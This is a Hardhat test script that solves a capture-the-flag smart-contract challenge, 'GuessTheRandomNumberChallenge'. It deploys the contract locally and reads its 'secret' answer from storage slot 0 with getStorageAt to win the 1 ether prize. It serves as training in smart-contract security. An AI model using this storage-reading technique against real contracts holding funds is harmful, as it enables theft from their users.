import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheRandomNumberChallenge', () => {
  let target: Contract;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    const targetFactory = await ethers.getContractFactory('GuessTheRandomNumberChallenge');
    target = await targetFactory.deploy({
      value: utils.parseEther('1'),
    });
    await target.deployed();

    console.log('Target deployed to:', target.address);
  });

  it('Exploit', async () => {
    const answer = await provider.getStorageAt(target.address, 0);
    const tx = await target.guess(answer, {
      value: utils.parseEther('1'),
    });
    await tx.wait();
  });

  after(async () => {
    expect(await target.isComplete()).to.equal(true);
  });
});
